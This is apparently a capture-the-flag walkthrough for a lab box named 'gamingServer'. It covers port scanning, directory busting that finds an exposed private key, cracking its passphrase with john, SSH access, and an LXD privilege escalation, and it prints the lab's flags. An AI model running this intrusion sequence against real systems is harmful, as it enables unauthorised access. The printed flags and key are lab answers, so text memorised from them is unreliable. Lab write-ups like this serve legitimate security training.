---
title: gamingServer
tags:
  - fetus
---
## nmap results:
- `Dscan.txt`:
```sh
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-16 12:00 EDT
Nmap scan report for 10.10.52.162
Host is up (0.18s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.15
OS details: Linux 4.15
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 146.12 seconds
```

## http enum: 
- cool site <br>
![[gamingServerMainHttpPage.png]]
- source has an interesting comment in it:
```html
<!-- john, please add some actual content to the site! lorem ipsum is horrible to look at. -->
```
- possible uname: 
```
john
```
- navigated the rest of the pages. didn't find anything interesting
- gonna run an ssh bruteforce while i do some directory busting
#### dirbusting results: 
- `feroxbuster --url http://10.10.52.162/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`:
```sh
301      GET        9l       28w      314c http://10.10.52.162/uploads => http://10.10.52.162/uploads/
200      GET       63l      544w     3070c http://10.10.52.162/uploads/manifesto.txt
200      GET      222l     1251w    87416c http://10.10.52.162/logo.png
200      GET       66l      119w     1435c http://10.10.52.162/about.html
200      GET       77l      316w     2762c http://10.10.52.162/index.html
200      GET       62l      379w     3067c http://10.10.52.162/myths.html
200      GET      676l     1423w    14223c http://10.10.52.162/style.css
200      GET        0l        0w   166291c http://10.10.52.162/featured-character.jpg
200      GET       77l      316w     2762c http://10.10.52.162/
200      GET      222l      221w     2006c http://10.10.52.162/uploads/dict.lst
200      GET        0l        0w    15457c http://10.10.52.162/uploads/meme.jpg
301      GET        9l       28w      313c http://10.10.52.162/secret => http://10.10.52.162/secret/
200      GET       30l       37w     1766c http://10.10.52.162/secret/secretKey
```
- the `uploads` directory had these three files: <br>
![[gamingServerUploadsDirectory.png]]
- `dict.lst`: [[gamingServerDict.lst]] 
- `manifesto.txt`: [[gamingServerManifesto.txt]] 
- `meme.jpg`: <br>
![[meme.jpg]]
- the image doesnt have anything embedded in it 
- the `secret` directory has a file called `secretKey`
- `secretKey`:
```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,82823EE792E75948EE2DE731AF1A0547

T7+F+3ilm5FcFZx24mnrugMY455vI461ziMb4NYk9YJV5uwcrx4QflP2Q2Vk8phx
H4P+PLb79nCc0SrBOPBlB0V3pjLJbf2hKbZazFLtq4FjZq66aLLIr2dRw74MzHSM
FznFI7jsxYFwPUqZtkz5sTcX1afch+IU5/Id4zTTsCO8qqs6qv5QkMXVGs77F2kS
Lafx0mJdcuu/5aR3NjNVtluKZyiXInskXiC01+Ynhkqjl4Iy7fEzn2qZnKKPVPv8
9zlECjERSysbUKYccnFknB1DwuJExD/erGRiLBYOGuMatc+EoagKkGpSZm4FtcIO
IrwxeyChI32vJs9W93PUqHMgCJGXEpY7/INMUQahDf3wnlVhBC10UWH9piIOupNN
SkjSbrIxOgWJhIcpE9BLVUE4ndAMi3t05MY1U0ko7/vvhzndeZcWhVJ3SdcIAx4g
/5D/YqcLtt/tKbLyuyggk23NzuspnbUwZWoo5fvg+jEgRud90s4dDWMEURGdB2Wt
w7uYJFhjijw8tw8WwaPHHQeYtHgrtwhmC/gLj1gxAq532QAgmXGoazXd3IeFRtGB
6+HLDl8VRDz1/4iZhafDC2gihKeWOjmLh83QqKwa4s1XIB6BKPZS/OgyM4RMnN3u
Zmv1rDPL+0yzt6A5BHENXfkNfFWRWQxvKtiGlSLmywPP5OHnv0mzb16QG0Es1FPl
xhVyHt/WKlaVZfTdrJneTn8Uu3vZ82MFf+evbdMPZMx9Xc3Ix7/hFeIxCdoMN4i6
8BoZFQBcoJaOufnLkTC0hHxN7T/t/QvcaIsWSFWdgwwnYFaJncHeEj7d1hnmsAii
b79Dfy384/lnjZMtX1NXIEghzQj5ga8TFnHe8umDNx5Cq5GpYN1BUtfWFYqtkGcn
vzLSJM07RAgqA+SPAY8lCnXe8gN+Nv/9+/+/uiefeFtOmrpDU2kRfr9JhZYx9TkL
wTqOP0XWjqufWNEIXXIpwXFctpZaEQcC40LpbBGTDiVWTQyx8AuI6YOfIt+k64fG
rtfjWPVv3yGOJmiqQOa8/pDGgtNPgnJmFFrBy2d37KzSoNpTlXmeT/drkeTaP6YW
RTz8Ieg+fmVtsgQelZQ44mhy0vE48o92Kxj3uAB6jZp8jxgACpcNBt3isg7H/dq6
oYiTtCJrL3IctTrEuBW8gE37UbSRqTuj9Foy+ynGmNPx5HQeC5aO/GoeSH0FelTk
cQKiDDxHq7mLMJZJO0oqdJfs6Jt/JO4gzdBh3Jt0gBoKnXMVY7P5u8da/4sV+kJE
99x7Dh8YXnj1As2gY+MMQHVuvCpnwRR7XLmK8Fj3TZU+WHK5P6W5fLK7u3MVt1eq
Ezf26lghbnEUn17KKu+VQ6EdIPL150HSks5V+2fC8JTQ1fl3rI9vowPPuC8aNj+Q
Qu5m65A5Urmr8Y01/Wjqn2wC7upxzt6hNBIMbcNrndZkg80feKZ8RD7wE7Exll2h
v3SBMMCT5ZrBFq54ia0ohThQ8hklPqYhdSebkQtU5HPYh+EL/vU1L9PfGv0zipst
gbLFOSPp+GmklnRpihaXaGYXsoKfXvAxGCVIhbaWLAp5AybIiXHyBWsbhbSRMK+P
-----END RSA PRIVATE KEY-----
```
- tried logging in with it. asks for a passphrase
## passphrase cracking with [[stegcracker]]:
- `ssh2john secretKey > hash`
- `john hash --wordlist=/usr/share/wordlists/rockyou.txt`:
```sh
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
letmein          (secretKey)     
1g 0:00:00:00 DONE (2025-04-16 12:22) 100.0g/s 51200p/s 51200c/s 51200C/s lover..letmein
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```
- passphrase:
```
letmein
```
## shell as `john`:
- `ssh -i secretKey john@10.10.52.162`
- `user.txt`:
```
a5c2ff8b9c2e3d4fe9d4ff2f1a5a6e7e
```
- `uname -a`:
```sh
Linux exploitable 4.15.0-76-generic #86-Ubuntu SMP Fri Jan 17 17:24:28 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
```
- `id`:
```sh
uid=1000(john) gid=1000(john) groups=1000(john),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
```
- `find / -perm -4000 2>/dev/null`:
```sh
/bin/mount
/bin/umount
/bin/su
/bin/fusermount
/bin/ping
/usr/lib/eject/dmcrypt-get-device
/usr/lib/snapd/snap-confine
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/bin/chsh
/usr/bin/newgidmap
/usr/bin/traceroute6.iputils
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/at
/usr/bin/pkexec
/usr/bin/newgrp
/usr/bin/newuidmap
/snap/core/8268/bin/mount
/snap/core/8268/bin/ping
/snap/core/8268/bin/ping6
/snap/core/8268/bin/su
/snap/core/8268/bin/umount
/snap/core/8268/usr/bin/chfn
/snap/core/8268/usr/bin/chsh
/snap/core/8268/usr/bin/gpasswd
/snap/core/8268/usr/bin/newgrp
/snap/core/8268/usr/bin/passwd
/snap/core/8268/usr/bin/sudo
/snap/core/8268/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/8268/usr/lib/openssh/ssh-keysign
/snap/core/8268/usr/lib/snapd/snap-confine
/snap/core/8268/usr/sbin/pppd
/snap/core/7270/bin/mount
/snap/core/7270/bin/ping
/snap/core/7270/bin/ping6
/snap/core/7270/bin/su
/snap/core/7270/bin/umount
/snap/core/7270/usr/bin/chfn
/snap/core/7270/usr/bin/chsh
/snap/core/7270/usr/bin/gpasswd
/snap/core/7270/usr/bin/newgrp
/snap/core/7270/usr/bin/passwd
/snap/core/7270/usr/bin/sudo
/snap/core/7270/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/7270/usr/lib/openssh/ssh-keysign
/snap/core/7270/usr/lib/snapd/snap-confine
/snap/core/7270/usr/sbin/pppd
```
- googled `lxd exploits`
- found this: https://www.exploit-db.com/exploits/46978 
- modified `build-alpine`: [[gamingServer-build-alpine]] 
	- gives a checksum error if the original one is ran. had to replace `echo` with `basename` at line `68` to have it working properly
- gave us a file named `alpine-v3.21-x86_64-20250416_1247.tar.gz`
- `root.txt`:
```
2e337b8c9f3aff0c2b3e8d4e6a7c88fc
```
